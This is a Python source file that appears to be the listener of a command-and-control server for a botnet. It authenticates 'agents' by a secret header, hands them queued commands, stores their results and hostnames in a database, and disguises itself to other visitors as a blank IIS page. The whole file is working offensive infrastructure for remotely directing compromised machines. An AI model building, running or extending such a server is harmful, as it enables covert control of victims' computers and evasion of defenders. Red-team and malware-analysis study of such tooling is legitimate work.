#!/usr/bin/env python3
# License: GPL-3.0

import socket
from sys import exit, argv
from ssl import wrap_socket
from threading import Thread
from server.logger import log_time
from server.db import update_client, cmd_check, update_results
from server.config import CLIENT_PAGE, CLIENT_KEY, sock_close, sock_send, \
    sock_recv, EXTERNALIP, KEY_FILE, CERT_FILE, SSL_VERSION

##################################################################
#
# HTTP Request Handler Class
#
##################################################################
def convert_headers(data):
    # Convert socket headers from str to dict
    headers = {}
    try:
        data = data.split("\r\n")
        for x in data:
            # Handle: GET / HTTP/1.0
            if x == data[0]:
                headers['Page'] = x.split(" ")[1]
            elif x == '\r': pass # Added \r on end of heaer
            else:
                try:
                    temp = x.split(": ")
                    headers[temp[0]] = ' '.join(temp[1:])
                except:
                    pass
    except Exception as e:
        if "-debug" in argv: print("[!] Error Converting Request Headers: {}".format(str(e)))

    if "-debug" in argv: print("[!] Client Request to Server:\n{}".format(headers))
    return headers

class request_handler():
    """
    Example Agent request:
    GET /agent_id.html HTTP/1.1\r\n
    Host: 127.0.0.1\r\n
    User-Agent: Mozilla/5.0\r\n\r\n
    Secret-Key: #################
    Hostname: ########
    os: ###########
    Data: #############
    """
    def __init__(self, sock, addr):
        try:
            # Sort request header
            request = convert_headers(sock_recv(sock))

            # Identify valid clients and send to handler
            if (request['Secret-Key'] == CLIENT_KEY) and (request['Page'] == CLIENT_PAGE):
                self.agent_handler(sock, request, addr[0])

            else:
                self.get_200(sock)

        except Exception as e:
            if "-debug" in argv: print("[!] Agent_Server Exp: {}".format(str(e)))
            self.get_200(sock)

        sock_close(sock)

    def get_200(self, sock):
        sock_send(sock, 'HTTP/1.1 200 OK\r\n'
                        'Host: {}\r\n'
                        'Content-Type: text/html\r\n'
                        'Server: IIS\r\n\r\n'
                        '<html><body></body></html>'.format(EXTERNALIP))

    def send_cmd(self, sock, data):
        sock_send(sock, 'HTTP/1.1 200 OK\r\n'
                        'Host: {}\r\n'
                        'Content-Type: text/html\r\n'
                        'Server: IIS\r\n\r\n'
                        '<html><body>{}</body></html>'.format(EXTERNALIP, data))

##################################################################
#
# Agent Handler
#
##################################################################
    def agent_handler(self, sock, request, remote_ip):
        # Main func to direct bot actions
        try:
            # New / Active bot checkin and check for cmd
            id = update_client(remote_ip, request['Hostname'], request['OS'], 'Active')
            cmd = cmd_check(id)

            # Send CMD
            if request['Data'] == "check-in" and cmd:
                self.send_cmd(sock, cmd)
                if "-debug" in argv: print("[-->] Agent_handler Sending {} CMD: {}".format(request['Hostname'],cmd))
            # Send OK
            elif request['Data'] == "check-in":
                return self.get_200(sock)
            elif request['Data'] == "{} Closed".format(request['Hostname']):
                # Client closed, set as inactive in database
                update_client(remote_ip, request['Hostname'], request['OS'], 'Inactive')
                update_results(id, request['Data'])
                return self.get_200(sock)
            # Read in agent results to db
            else:
                update_results(id, request['Data'])
                if "-debug" in argv: print("[<--] Agent_handler Received Result {} from {}".format(request['Data'], request['Hostname']))
                return self.get_200(sock)
        except:
            self.get_200(sock)

##################################################################
#
# HTTPS Server - Built on Sockets
#
##################################################################
def ClientServer():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(('0.0.0.0', 443))
    except:
        print('[{}] Agent server failed to bind: localhost:443'.format(log_time()))
        exit(1)
    sock.listen(20)
    # Continuously accept new connections
    while True:
        client_socket, addr = sock.accept()
        try:
            # ssl wrap sock
            ssl_sock = wrap_socket(client_socket, server_side=True, certfile=CERT_FILE, keyfile=KEY_FILE, ssl_version=SSL_VERSION)

            # Request handler in new thread
            Thread(target=request_handler, args=(ssl_sock,addr,), daemon=True).start()
        except KeyboardInterrupt:
            exit(0) # Debug
        except Exception as e:
            try:
                sock_close(ssl_sock)
            except:
                pass